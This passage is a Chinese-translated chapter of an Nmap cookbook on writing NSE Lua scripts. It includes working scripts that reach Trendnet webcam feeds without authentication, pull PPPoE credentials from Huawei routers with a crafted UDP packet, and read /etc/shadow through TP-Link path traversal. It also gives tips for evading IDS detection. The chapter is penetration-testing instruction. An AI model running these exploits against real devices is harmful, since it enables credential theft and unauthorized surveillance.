# 第九章。编写您自己的 NSE 脚本

### 注意

本章将向您展示如何执行在许多情况下可能是非法、不道德、违反服务条款或不明智的一些操作。这里提供这些信息是为了让您了解如何保护自己免受威胁，并使自己的系统更加安全。在遵循这些说明之前，请确保您站在法律和道德的一边……善用您的力量！

在本章中，我们将涵盖：

+   通过发出 HTTP 请求来识别易受攻击的 Trendnet 网络摄像头

+   使用 NSE 套接字发送 UDP 有效载荷

+   利用 NSE 利用路径遍历漏洞

+   编写暴力破解脚本

+   使用网络爬虫库

+   在 NSE 脚本中正确报告漏洞

+   编写您自己的 NSE 库

+   在 NSE 线程、条件变量和互斥体中工作

# 介绍

Nmap 脚本引擎于 2007 年在版本 4.5 中推出，以利用在端口或网络扫描期间收集的信息，并使用强大的脚本语言 Lua 执行附加任务，从而将 Nmap 的功能扩展到一个全新的水平。这一功能已经成为一个完整的武器库，已经正式包含了近 300 个脚本。您可以通过这一功能完成的任务数量令人印象深刻，就像您在本书中学到的那样。

Lua 是一种脚本语言，目前在其他重要项目中使用，如魔兽世界、Wireshark 和 Snort，有很好的原因。Lua 非常轻量级和可扩展。作为 NSE 开发人员，我对 Lua 的经验非常积极。该语言非常强大和灵活，但语法清晰且易于学习。因为 Lua 本身就是一个完整的主题，我将无法专注于其所有出色的功能，但我建议您阅读官方参考手册[`www.lua.org/manual/5.2/`](http://www.lua.org/manual/5.2/)。

每个 NSE 脚本接收两个参数：主机和端口表。它们包含在发现或端口扫描期间收集的信息。只有在设置了某些标志时，才会填充一些信息字段。主机表中的一些字段是：

+   `host.os`：包含 OS 匹配数组的表（需要标志`-O`）

+   `host.ip`：目标 IP

+   `host.name`：如果可用，返回反向 DNS 条目

有关完整字段列表，请访问[`nmap.org/book/nse-api.html#nse-api-arguments`](http://nmap.org/book/nse-api.html#nse-api-arguments)。

另一方面，端口表包含：

+   `port.number`：端口号

+   `port.protocol`：端口协议

+   `port.service`：服务名称

+   `port.version`：服务版本

+   `port.state`：端口状态

Nmap 脚本引擎提供的灵活性和信息的结合，使渗透测试人员和系统管理员在编写脚本自动化任务时节省了大量的开发时间。

Nmap 背后的社区是令人惊讶且非常合作的。我可以说他们是开源社区中最热情的人之一。每周都会添加新的脚本和库，这也成为渗透测试人员需要将最新的开发快照纳入其武器库的原因。

为了纪念 David Fifield 和 Fyodor 在 Defcon 2010 中介绍 Nmap 脚本引擎的演讲，他们编写了一个脚本来检测易受攻击的 httpd 网络摄像头，我们将开始编写我们自己的 NSE 脚本来检测 Trendnet 摄像头。

在本章中，您还将学习如何编写执行暴力破解密码审核的 NSE 脚本，并使用新的 HTTP 爬虫库来自动执行安全检查。我们将讨论处理 NSE 套接字和原始数据包以利用漏洞的脚本。我们将介绍一些 NSE 库，这些库允许我们发出 HTTP 请求、管理找到的凭据，并向用户报告漏洞。

Nmap 脚本引擎发展迅速，增长更快。由于空间有限，不可能涵盖该项目已经拥有的所有优秀 NSE 脚本和库，但我邀请您访问官方书籍网站[`nmap-cookbook.com`](http://nmap-cookbook.com)获取额外的配方和脚本示例，我将在未来发布。

希望在阅读我为您挑选的配方后，您将学会应对更具挑战性的任务所需的所有必要工具。将调试模式设为您的朋友（`-d[1-9]`），当然，不要忘记通过将您的脚本或补丁发送至`<nmap-dev@insecure.org>`来为这个令人惊叹的项目做出贡献。

如果这是您第一次为 NSE 编写脚本，我建议您下载并学习脚本的整体结构和必要字段。我上传了我用于[`github.com/cldrn/nmap-nse-scripts/blob/master/nse-script-template.nse`](https://github.com/cldrn/nmap-nse-scripts/blob/master/nse-script-template.nse)的模板。

Ron Bowes 还在[`nmap.org/svn/docs/sample-script.nse`](http://nmap.org/svn/docs/sample-script.nse)上为 NSE 脚本编写了非常详细的模板。

完整的 NSE 脚本格式文档可以在[`nmap.org/book/nse-script-format.html`](http://nmap.org/book/nse-script-format.html)上找到。

# 进行 HTTP 请求以识别易受攻击的 Trendnet 网络摄像头

Nmap 脚本引擎提供了一个库，用于处理 HTTP 客户端的请求和其他常见功能。使用此库，NSE 开发人员可以完成许多任务，从信息收集到漏洞利用。

此配方将向您展示如何使用 HTTP 库发送 HTTP 请求以识别易受攻击的 Trendnet TV-IP110W 网络摄像头。

## 如何操作...

Trendnet TV-IP110W 网络摄像头允许通过简单请求 URI`/anony/mjpg.cgi`来访问其视频源而无需身份验证。让我们编写一个 NSE 脚本来检测这些设备。现在，让我们忽略文档标签：

1.  创建文件`http-trendnet-tvip110w.nse`，并从填写 NSE 脚本基本信息字段开始：

```
    description = [[
    Attempts to detect webcams Trendnet TV-IP110W vulnerable to unauthenticated access to the video stream by querying the URI "/anony/mjpg.cgi".

    Original advisory: http://console-cowboys.blogspot.com/2012/01/trendnet-cameras-i-always-feel-like.html
    ]]

    categories = {"exploit","vuln"}
    ```

1.  我们加载将需要的库。请注意，此格式对应于 Nmap 6.x：

```
    local http = require "http"
    local shortport = require "shortport"
    local stdnse = require "stdnse"
    ```

1.  我们定义我们的执行规则。我们使用别名`shortport.http`告诉 Nmap 在找到 Web 服务器时执行脚本：

```
    portrule = shortport.http
    ```

1.  我们的主要功能将识别 404 响应的类型，并通过向`/anony/mjpg.cgi`发送 HTTP 请求并检查状态码 200 来确定网络摄像头是否容易受到未经授权的访问：

```
    action = function(host, port)
      local uri = "/anony/mjpg.cgi"

      local _, status_404, resp_404 = http.identify_404(host, port)
      if status_404 == 200 then
        stdnse.print_debug(1, "%s: Web server returns ambiguous response. Trendnet webcams return standard 404 status responses. Exiting.", SCRIPT_NAME)
        return
      end

      stdnse.print_debug(1, "%s: HTTP HEAD %s", SCRIPT_NAME, uri)
      local resp = http.head(host, port, uri)
      if resp.status and resp.status == 200 then
        return string.format("Trendnet TV-IP110W video feed is unprotected:http://%s/anony/mjpg.cgi", host.ip)
      end
    end
    ```

1.  现在只需针对目标运行 NSE 脚本：

```
    $ nmap -p80 -n -Pn --script http-trendnet-tvip110w.nse <target>

    ```

1.  如果找到易受攻击的网络摄像头，您将看到以下输出：

```
    PORT   STATE SERVICE REASON
    80/tcp open  http    syn-ack
    |_http-trendnet-tvip110w: Trendnet TV-IP110W video feed is unprotected:http://192.168.4.20/anony/mjpg.cgi
    ```

带有文档标签的完整脚本可以从[`github.com/cldrn/nmap-nse-scripts/blob/master/scripts/6.x/http-trendnet-tvip110w.nse`](https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/6.x/http-trendnet-tvip110w.nse)下载。

## 工作原理...

在脚本`http-trendnet-tvip110w.nse`中，我们使用`shortport`库中的别名`http`定义了执行规则：

```
portrule = shortport.http
```

别名`shortport.http`在文件`/nselib/shortport.lua`中定义如下：

```
LIKELY_HTTP_PORTS = {
        80, 443, 631, 7080, 8080, 8088, 5800, 3872, 8180, 8000
}

LIKELY_HTTP_SERVICES = {
        "http", "https", "ipp", "http-alt", "vnc-http", "oem-agent", "soap",
        "http-proxy",
}

http = port_or_service(LIKELY_HTTP_PORTS, LIKELY_HTTP_SERVICES)
```

`http`库具有诸如`http.head()`、`http.get()`和`http.post()`的方法，分别对应于常见的 HTTP 方法`HEAD`、`GET`和`POST`，但它还有一个名为`http.generic_request()`的通用方法，允许开发人员更灵活地尝试更晦涩的 HTTP 动词。

在脚本`http-trendnet-tvip110w`中，我们使用函数`http.head()`检索 URI`/anony/mjpg.cgi`：

```
local resp = http.head(host, port, uri)
```

函数`http.head()`返回一个包含以下响应信息的表：

+   `status-line`：包含返回的状态行。例如，`HTTP/1.1 404 Not Found`。

+   `status`：包含 Web 服务器返回的状态码。

+   `body`：包含响应正文。

+   `cookies`：Web 服务器设置的 cookie 表。

+   `header`：返回的标题存储在关联表中。标题的名称用作索引。例如，`header["server"]`包含 Web 服务器返回的 Server 字段。

+   `rawheader`：按照它们被 Web 服务器发送的顺序编号的标题的数组。

脚本`http-trendnet-tvip110w.nse`中还使用了库`stdnse`。这个库是一组在编写 NSE 脚本时非常方便的杂项函数。脚本使用了函数`stdnse.print_debug()`，这是一个用于打印调试消息的函数。

```
stdnse.print_debug(<debug level required>, <format string>, arg1, arg2...)  
```

这些库的完整文档可以在[`nmap.org/nsedoc/lib/http.html`](http://nmap.org/nsedoc/lib/http.html)和[`nmap.org/nsedoc/lib/stdnse.html`](http://nmap.org/nsedoc/lib/stdnse.html)找到。

## 还有更多...

当页面不存在时，一些 Web 服务器不会返回常规的状态 404 代码响应，而是始终返回状态码 200。这是一个经常被忽视的方面，甚至我以前也犯过这个错误，假设状态码 200 意味着 URI 存在。我们需要小心处理这个问题，以避免在我们的脚本中出现误报。函数`http.identify_404()`和`http.page_exists()`被创建用于识别服务器是否返回常规的 404 响应以及给定页面是否存在。

```
local status_404, req_404, page_404 = http.identify_404(host, port)
```

如果函数`http.identify_404(host, port)`成功，我们可以使用`http.page_exists()`：

```
if http.page_exists(data, req_404, page_404, uri, true) then
  stdnse.print_debug(1, "Page exists! → %s", uri)
end
```

### 调试 Nmap 脚本

如果发生意外情况，请打开调试以获取更多信息。Nmap 使用`-d`标志进行调试，您可以设置 0 到 9 之间的任何整数：

```
$ nmap -p80 --script http-google-email -d4 <target>

```

### 以编程方式设置用户代理

有些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-sqli-finder --script-args http.useragent="Mozilla 42" <target>

```

要在您的 NSE 脚本中设置用户代理，可以传递标题字段：

```
options = {header={}}
options['header']['User-Agent'] = "Mozilla/9.1 (compatible; Windows NT 5.0 build 1420;)"
local req = http.get(host, port, uri, options)
```

### HTTP 流水线处理

某些 Web 服务器的配置支持在单个数据包中封装多个 HTTP 请求。这可能加快 NSE HTTP 脚本的执行速度，建议如果 Web 服务器支持，则使用它。默认情况下，`http`库尝试对 40 个请求进行流水线处理，并根据网络条件和`Keep-Alive`标头自动调整该数字。

用户需要设置脚本参数`http.pipeline`来调整此值：

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

要在您的 NSE 脚本中实现 HTTP 流水线处理，请使用函数`http.pipeline_add()`和`http.pipeline()`。首先，初始化一个变量来保存请求：

```
local reqs = nil
```

使用`http.pipeline_add()`向管道添加请求：

```
reqs = http.pipeline_add('/Trace.axd', nil, reqs)
reqs = http.pipeline_add('/trace.axd', nil, reqs)
reqs = http.pipeline_add('/Web.config.old', nil, reqs)
```

添加请求后，使用`http.pipeline()`执行管道：

```
local results = http.pipeline(target, 80, reqs)
```

变量结果将包含添加到 HTTP 请求队列中的响应对象的数量。要访问它们，您可以简单地遍历对象：

```
for i, req in pairs(results) do
  stdnse.print_debug(1, "Request #%d returned status %d", I, req.status)
end
```

## 另请参阅

+   *使用 NSE 套接字发送 UDP 负载*配方

+   *使用 NSE 利用路径遍历漏洞*配方

+   *编写暴力脚本*配方

+   *使用 Web 爬行库*配方

+   *在 NSE 脚本中正确报告漏洞*配方

+   *编写自己的 NSE 库*配方

+   第四章中的*列出支持的 HTTP 方法*配方，*审计 Web 服务器*

+   第四章中的*检查 HTTP 代理是否开放*配方，*审计 Web 服务器*

+   第四章中的*检测 Web 应用程序防火墙*配方，*审计 Web 服务器*

+   第四章中的*检测可能的 XST 漏洞*配方，*审计 Web 服务器*

# 使用 NSE 套接字发送 UDP 负载

Nmap 脚本引擎提供了一个强大的库，用于处理网络 I/O 操作，提供了一个接口到**Nsock**。Nsock 是 Nmap 的优化并行套接字库，其灵活性允许开发人员处理原始数据包，并决定是否使用阻塞或非阻塞的网络 I/O 操作。

这个教程将介绍编写一个 NSE 脚本的过程，该脚本从文件中读取有效负载并发送 UDP 数据包以利用华为 HG5xx 路由器的漏洞。

## 如何做...

当华为 HG5xx 路由器接收到 UDP 端口 43690 的特殊数据包时，会泄露敏感信息。这个漏洞引起了我的注意，因为这是一个非常流行的设备，可以远程工作，并获取有趣的信息，如 PPPoE 凭据、MAC 地址和确切的软件/固件版本。让我们编写一个脚本来利用这些设备：

1.  首先，创建文件`huawei-hg5xx-udpinfo.nse`并定义信息标签：

```
    description=[[
    Tries to obtain the PPPoE credentials, MAC address, firmware version and IP information of the aDSL modemsHuawei Echolife 520, 520b, 530 and possibly others by exploiting an information disclosure vulnerability via UDP.

    The script works by sending a crafted UDP packet to port 43690 and then parsing the response that containsthe configuration values. This exploit has been reported to be blocked in some ISPs, in those cases the exploit seems to work fine in local networks.
    Vulnerability discovered by Pedro Joaquin. No CVE assigned.

    References:
    * http://www.hakim.ws/huawei/HG520_udpinfo.tar.gz
    * http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure
    ]]
    ```

1.  加载所需的库（Nmap 6.x 格式）：

```
    local "stdnse" = require "stdnse"
    local "io" = require "io"
    local "shortport" = require "shortport"
    ```

1.  定义执行规则：

```
    portrule = shortport.portnumber(43690, "udp", {"open", "open|filtered","filtered"})
    ```

1.  创建一个函数，从文件中加载 UDP 负载：

```
    load_udp_payload = function()
      local payload_l = nmap.fetchfile(PAYLOAD_LOCATION)
      if (not(payload_l)) then
        stdnse.print_debug(1, "%s:Couldn't locate payload %s", SCRIPT_NAME, PAYLOAD_LOCATION)
        return
      end
      local payload_h = io.open(payload_l, "rb")
      local payload = payload_h:read("*a")
      if (not(payload)) then
        stdnse.print_debug(1, "%s:Couldn't load payload %s", SCRIPT_NAME, payload_l)
        if nmap.verbosity()>=2 then
          return "[Error] Couldn't load payload"
        end
        return
      end

      payload_h:flush()
      payload_h:close()
      return payload
    end
    ```

1.  创建一个函数，创建一个 NSE 套接字并发送特殊的 UDP 数据包：

```
    send_udp_payload = function(ip, timeout, payload)
      local data
      stdnse.print_debug(2, "%s:Sending UDP payload", SCRIPT_NAME)
      local socket = nmap.new_socket("udp")
      socket:set_timeout(tonumber(timeout))
      local status = socket:connect(ip, HUAWEI_UDP_PORT, "udp")
      if (not(status)) then return end
      status = socket:send(payload)
      if (not(status)) then return end
      status, data = socket:receive()
      if (not(status)) then
        socket:close()
        return
      end
      socket:close()
      return data
    end
    ```

1.  添加主要方法，加载并发送 UDP 负载：

```
    action = function(host, port)
      local timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 3000
      local payload = load_udp_payload()
      local response = send_udp_payload(host.ip, timeout, payload)
      if response then
        return parse_resp(response)
      end
    end
    ```

1.  您可以使用以下命令运行最终脚本：

```
    # nmap -sU -p43690 --script huawei-hg5xx-udpinfo <target>

    ```

一个有漏洞的设备将返回以下输出：

```
PORT      STATE         SERVICE REASON
-- 43690/udp open|filtered unknown no-response
-- |_huawei5xx-udp-info: |\x10||||||||<Firmware version>|||||||||||||||||||||||||||||||<MAC addr>|||<Software version>||||||||||||||||||||||||||||||||||||||||||||| <local ip>|||||||||||||||||||<remote ip>||||||||||||||||||<model>|||||||||||||||<pppoe user>|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<pppoe password>
```

## 工作原理...

我们的脚本`huawei-hg5xx-udpinfo`使用别名`shortport.portnumber(ports, protos, states)`定义了执行规则。如果 UDP 端口 43690 是`open`、`open|filtered`或`filtered`，我们的脚本将运行：

```
portrule = shortport.portnumber(43690, "udp", {"open", "open|filtered","filtered"})
```

您可以以几种不同的方式读取 NSE 参数，但推荐的函数是`stdnse.get_script_args()`。这允许多个赋值，并支持快捷赋值（您不必在参数名之前输入脚本名称）：

```
local timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 3000
```

NSE 套接字由`nmap`库管理。要创建一个 NSE 套接字，使用函数`nmap.new_socket()`，要连接到这个套接字，使用`connect()`：

```
local socket = nmap.new_socket("udp")
socket:set_timeout(tonumber(timeout))
local status = socket:connect(ip, HUAWEI_UDP_PORT, "udp")
```

我们发送我们的 UDP 负载如下：

```
status = socket:send(payload)
```

我们从 NSE 套接字中读取响应：

```
status, data = socket:receive()
```

和往常一样，我们需要在完成时使用`close()`函数关闭套接字：

```
local socket = nmap.net_socket("udp")
…
socket:close()
```

现在我们可以处理接收到的数据。在这种情况下，我将用一个更容易阅读的输出替换空字符：

```
return data:gsub("%z", "|")
```

您可以从[`github.com/cldrn/nmap-nse-scripts/blob/master/scripts/6.x/huawei5xx-udp-info.nse`](https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/6.x/huawei5xx-udp-info.nse)下载完整的脚本。

## 还有更多...

脚本`huawei-hg5xx-udpinfo`使用标准的连接样式，其中创建套接字，建立连接，发送和/或接收数据，然后关闭连接。

如果您需要更多控制，`nmap`库还支持读取和写入原始数据包。脚本引擎使用`libpcap`包装器通过 Nsock 读取原始数据包，并可以在以太网或 IP 层发送它们。

当读取原始数据包时，您需要打开捕获设备并注册一个监听器，以处理数据包的到达。函数`pcap_open()`、`pcap_receive()`和`pcap_close()`对应于打开捕获设备、接收数据包和关闭监听器。我建议您查看脚本`sniffer-detect`（[`nmap.org/nsedoc/scripts/sniffer-detect.html`](http://nmap.org/nsedoc/scripts/sniffer-detect.html)）、`firewalk`（[`nmap.org/svn/scripts/firewalk.nse`](http://nmap.org/svn/scripts/firewalk.nse)）和`ipidseq`（[`nmap.org/svn/scripts/ipidseq.nse`](http://nmap.org/svn/scripts/ipidseq.nse)）。

如果需要发送原始数据包，使用`nmap.new_dnet()`创建一个`dnet`对象，并根据层（IP 或以太网），使用`ip_open()`或`ethernet_open()`方法打开连接。要实际发送原始数据包，使用适当的`ip_send()`或`ethernet_send()`函数。来自脚本`ipidseq.nse`的以下片段说明了该过程：

```
local genericpkt = function(host, port)
        local pkt = bin.pack("H",
                "4500 002c 55d1 0000 8006 0000 0000 0000" ..
                "0000 0000 0000 0000 0000 0000 0000 0000" ..
                "6002 0c00 0000 0000 0204 05b4"
        )
        local tcp = packet.Packet:new(pkt, pkt:len())
        tcp:ip_set_bin_src(host.bin_ip_src)
        tcp:ip_set_bin_dst(host.bin_ip)
        tcp:tcp_set_dport(port)
        updatepkt(tcp)
        return tcp
end
...
local sock = nmap.new_dnet()
try(sock:ip_open())
try(sock:ip_send(tcp.buf))
sock:ip_close()
```

我鼓励您阅读这些库的整个文档，网址为[`nmap.org/nsedoc/lib/nmap.html`](http://nmap.org/nsedoc/lib/nmap.html)。如果您正在使用原始数据包，库`packet`也会对您有很大帮助([`nmap.org/nsedoc/lib/packet.html)`](http://nmap.org/nsedoc/lib/packet.html))。

### 异常处理

`nmap`库为设计用于帮助网络 I/O 任务的 NSE 脚本提供了异常处理机制。

`nmap`库的异常处理机制按预期工作。我们将要监视异常的代码包装在`nmap.try()`调用内。函数返回的第一个值表示完成状态。如果返回`false`或`nil`，则第二个返回值必须是错误字符串。在成功执行的其余返回值可以根据需要进行设置和使用。`nmap.new_try()`定义的 catch 函数将在引发异常时执行。

以下示例代码是脚本`mysql-vuln-cve2012-2122.nse`的片段([`nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html`](http://nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html))。在此脚本中，catch 函数执行一些简单的垃圾收集，如果套接字保持打开状态：

```
local catch = function()  socket:close() end
local try = nmap.new_try(catch)
…
  try( socket:connect(host, port) )
  response = try( mysql.receiveGreeting(socket) )
```

NSE 库`nmap`的官方文档可在[`nmap.org/nsedoc/lib/nmap.html`](http://nmap.org/nsedoc/lib/nmap.html)找到。

### 调试 Nmap 脚本

如果发生意外情况，请打开调试以获取更多信息。Nmap 使用`-d`标志进行调试，您可以设置 0 到 9 之间的任何整数：

```
$ nmap -p80 --script http-google-email -d4 <target>

```

## 另请参阅

+   *进行 HTTP 请求以识别易受攻击的 Trendnet 网络摄像头*配方

+   *使用 NSE 利用路径遍历漏洞*配方

+   *编写蛮力脚本*配方

+   *使用 Web 爬行库*配方

+   *在 NSE 脚本中正确报告漏洞*配方

+   *编写自己的 NSE 库*配方

+   *使用 NSE 线程、条件变量和互斥体在 NSE 中工作*配方

# 使用 NSE 利用路径遍历漏洞

路径遍历漏洞存在于许多 Web 应用程序中。Nmap NSE 使渗透测试人员能够快速编写脚本来利用它们。Lua 还支持字符串捕获，这在使用比正则表达式更简单的语法来提取信息时非常有帮助。

这个配方将教你如何编写一个 NSE 脚本，以利用 TP-Link 路由器某些型号中存在的路径遍历漏洞。

## 如何做...

我们将编写一个 NSE 脚本，利用几个 NSE 库和 Lua 的字符串库来利用几个 TP-Link 路由器中的路径遍历漏洞。

1.  创建文件`http-tplink-dir-traversal.nse`并完成 NSE 信息标签：

```
    description = [[
    Exploits a directory traversal vulnerability existing in several TP-Link wireless routers. Attackers may exploit this vulnerability to read any of the configuration and password files remotely and without authentication.

    This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but there are several models that use the same HTTP server so I believe they could be vulnerable as well. I appreciateany help confirming the vulnerability in other models.

    Advisory:
    * http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740

    Other interesting files:
    * /tmp/topology.cnf (Wireless configuration)
    * /tmp/ath0.ap_bss (Wireless encryption key)
    ]]
    ```

1.  加载所需的库（Nmap 6.x 格式）：

```
    local http = require "http"
    local io = require "io"
    local shortport = require "shortport"
    local stdnse = require "stdnse"
    local string = require "string"
    local vulns = require "vulns"
    ```

1.  使用`shortport`库的帮助定义执行规则：

```
    portrule = shortport.http
    ```

1.  编写一个函数来发送路径遍历请求并确定 Web 应用程序是否易受攻击：

```
    local function check_vuln(host, port)
      local evil_uri = "/help/../../etc/shadow"
      stdnse.print_debug(1, "%s:HTTP GET %s", SCRIPT_NAME, evil_uri)
      local response = http.get(host, port, evil_uri)
      if response.body and response.status==200 and response.body:match("root:") then
        stdnse.print_debug(1, "%s:Pattern 'root:' found.", SCRIPT_NAME, response.body)
        return true
      end
      return false
    end
    ```

1.  读取并解析响应中的文件，借助 Lua 捕获(`.*`)的一些帮助：

```
    local _, _, rfile_content = string.find(response.body, 'SCRIPT>(.*)')
    ```

1.  最后，使用以下命令执行脚本：

```
    $ nmap -p80 --script http-tplink-dir-traversal.nse <target>

    ```

易受攻击的设备将产生以下输出：

```
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-tplink-dir-traversal:
-- |   VULNERABLE:
-- |   Path traversal vulnerability in several TP-Link wireless routers
-- |     State: VULNERABLE (Exploitable)
-- |     Description:
-- |       Some TP-Link wireless routers are vulnerable to a path traversal vulnerability that allows attackers to read configurations or any other file in the device.
-- |       This vulnerability can be exploited remotely and without authentication.
-- |       Confirmed vulnerable models: WR740N, WR740ND, WR2543ND
-- |       Possibly vulnerable (Based on the same firmware): WR743ND,WR842ND,WA-901ND,WR941N,WR941ND,WR1043ND,MR3220,MR3020,WR841N.
-- |     Disclosure date: 2012-06-18
-- |     Extra information:
-- |       /etc/shadow :
-- |   
-- |   root:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
-- |   Admin:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
-- |   bin::10933:0:99999:7:::
-- |   daemon::10933:0:99999:7:::
-- |   adm::10933:0:99999:7:::
-- |   lp:*:10933:0:99999:7:::
-- |   sync:*:10933:0:99999:7:::
-- |   shutdown:*:10933:0:99999:7:::
-- |   halt:*:10933:0:99999:7:::
-- |   uucp:*:10933:0:99999:7:::
-- |   operator:*:10933:0:99999:7:::
-- |   nobody::10933:0:99999:7:::
-- |   ap71::10933:0:99999:7:::
-- |   
-- |     References:
-- |_      http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740
```

## 它是如何工作的...

脚本`http-tplink-dir-traversal.nse`执行以下任务以利用讨论的路径遍历漏洞：

1.  首先，它发送路径遍历请求以确定安装是否易受攻击。

1.  如果安装易受攻击，则从 Web 服务器发送的响应中提取请求的文件。

1.  向用户报告漏洞并提供概念验证。

在这种情况下，需要`http`库来发送包含路径遍历有效负载的 HTTP 请求。为了确定设备是否易受攻击，我们请求文件`/etc/shadow`，因为我们知道所有设备中都存在此文件，并且其中必须存在一个 root 帐户：

```
local response = http.get(host, port, "/help/../../../etc/shadow")
```

响应应该包含请求的文件，位于结束脚本标记`</SCRIPT>`之后的正文中：

![工作原理...](img/7485_09_01.jpg)

要确认可利用性，我们只需要将响应主体与字符串"root:"进行匹配：

```
if response.body and response.status==200 and response.body:match("root:") then
    stdnse.print_debug(1, "%s:Pattern 'root:' found.", SCRIPT_NAME, response.body)
    return true
  end
```

Lua 捕获允许开发人员提取与给定模式匹配的字符串。它们非常有帮助，我强烈建议您尝试一下（[`www.lua.org/pil/20.3.html`](http://www.lua.org/pil/20.3.html)）：

```
local _, _, rfile_content = string.find(response.body, 'SCRIPT>(.*)')
```

一旦确认漏洞，建议使用`vulns`库进行报告。该库旨在统一各种 NSE 脚本使用的输出格式。它支持多个字段，以有组织的方式提供所有漏洞详细信息：

```
local vuln = {
       title = 'Path traversal vulnerability in several TP-Link wireless routers',
       state = vulns.STATE.NOT_VULN,
       description = [[
Some TP-Link wireless routers are vulnerable to a path traversal vulnerability that allows attackers to read configurations or any other file in the device.
This vulnerability can be exploited without authentication.Confirmed vulnerable models: WR740N, WR740ND, WR2543ND
Possibly vulnerable (Based on the same firmware): WR743ND,WR842ND,WA-901ND,WR941N,WR941ND,WR1043ND,MR3220,MR3020,WR841N.]],
       references = {
           'http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740'
       },
       dates = {
           disclosure = {year = '2012', month = '06', day = '18'},       },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
```

在`vulns`库中定义了以下状态：

```
STATE_MSG = {
  [STATE.LIKELY_VULN] = 'LIKELY VULNERABLE',
  [STATE.NOT_VULN] = 'NOT VULNERABLE',
  [STATE.VULN] = 'VULNERABLE',
  [STATE.DoS] = 'VULNERABLE (DoS)',
  [STATE.EXPLOIT] = 'VULNERABLE (Exploitable)',
  [bit.bor(STATE.DoS,STATE.VULN)] = 'VUNERABLE (DoS)',
  [bit.bor(STATE.EXPLOIT,STATE.VULN)] = 'VULNERABLE (Exploitable)',
}
```

要返回漏洞报告，请使用`make_output(vuln)`。如果状态设置为除`vulns.STATE.NOT_VULN`之外的任何值，此函数将返回漏洞报告：

```
local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
local vuln = { title = "VULN TITLE", ...}
…
vuln.state = vulns.STATE.EXPLOIT
…
vuln_report:make_output(vuln)
```

检查前面示例中的脚本输出，以查看使用 NSE 库`vulns`时漏洞报告的外观。访问该库的官方文档，了解更多可能的报告字段及其用法：[`nmap.org/nsedoc/lib/vulns.html`](http://nmap.org/nsedoc/lib/vulns.html)。

## 还有更多...

在编写 NSE 脚本以利用路径遍历漏洞时，请记住 IPS/IDS 供应商将创建补丁来识别您的检测探针。如果可能的话，我建议您使用支持的最隐秘的编码方案。在上一个示例中，应用程序没有正确读取其他编码，我们别无选择，只能使用众所周知的模式`"../"`，这将被任何体面的 WAF/IPS/IDS 检测到。

我建议使用工具 Dotdotpwn（[`dotdotpwn.blogspot.com/`](http://dotdotpwn.blogspot.com/)）及其模块`payload`来定位利用路径遍历漏洞时的模糊编码。理想情况下，您还可以编写一个小函数，随机使用不同的路径遍历模式来处理每个请求：

```
local traversals = {"../", "%2f"}

```

### 调试 NSE 脚本

如果发生意外情况，请打开调试以获取额外信息。Nmap 使用`-d`标志进行调试，您可以设置 0 到 9 之间的任何整数：

```
$ nmap -p80 --script http-google-email -d4 <target>

```

### 以编程方式设置用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-sqli-finder --script-args http.useragent="Mozilla 42" <target>

```

要在您的 NSE 脚本中设置用户代理，可以传递头字段：

```
options = {header={}}
options['header']['User-Agent'] = "Mozilla/9.1 (compatible; Windows NT 5.0 build 1420;)"
local req = http.get(host, port, uri, options)
```

### HTTP 管线

一些 Web 服务器配置支持将一个以上的 HTTP 请求封装在单个数据包中。这可能加快 NSE HTTP 脚本的执行速度，建议在 Web 服务器支持的情况下使用。默认情况下，`http`库尝试对 40 个请求进行管线处理，并根据网络条件和`Keep-Alive`头自动调整该数字。

用户需要将脚本参数`http.pipeline`设置为调整此值：

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

要在您的 NSE 脚本中实现 HTTP 管线，请使用函数`http.pipeline_add()`和`http.pipeline()`。首先，初始化一个变量来保存请求：

```
local reqs = nil
```

使用`http.pipeline_add()`将请求添加到管道中：

```
reqs = http.pipeline_add('/Trace.axd', nil, reqs)
reqs = http.pipeline_add('/trace.axd', nil, reqs)
reqs = http.pipeline_add('/Web.config.old', nil, reqs)
```

添加请求后，使用`http.pipeline()`执行管道：

```
local results = http.pipeline(target, 80, reqs)
```

变量结果将包含添加到 HTTP 请求队列的响应对象的数量。要访问它们，您可以简单地遍历对象：

```
for i, req in pairs(results) do
  stdnse.print_debug(1, "Request #%d returned status %d", I, req.status)
end
```

## 另请参阅

+   *进行 HTTP 请求以识别易受攻击的 Trendnet 网络摄像头*配方

+   *使用 NSE 套接字发送 UDP 负载*配方

+   *检测 Web 应用程序防火墙*配方第四章, *审计 Web 服务器*

+   *检测可能的 XST 漏洞*配方第四章, *审计 Web 服务器*

+   *编写暴力脚本*配方

+   *使用 Web 爬行库*配方

+   *在 NSE 脚本中正确报告漏洞*配方

# 编写暴力脚本

暴力破解密码审计已经成为 Nmap 脚本引擎的一个主要优势。库`brute`允许开发人员快速编写脚本来执行他们的自定义暴力破解攻击。Nmap 提供了诸如`unpwd`这样的库，它可以访问灵活的用户名和密码数据库，以进一步定制攻击，以及`creds`库，它提供了一个接口来管理找到的有效凭据。

这个食谱将指导您通过使用 NSE 库`brute`，`unpwdb`和`creds`来执行针对 Wordpress 安装的暴力破解密码审计的过程。

## 如何做...

让我们编写一个 NSE 脚本来暴力破解 Wordpress 帐户：

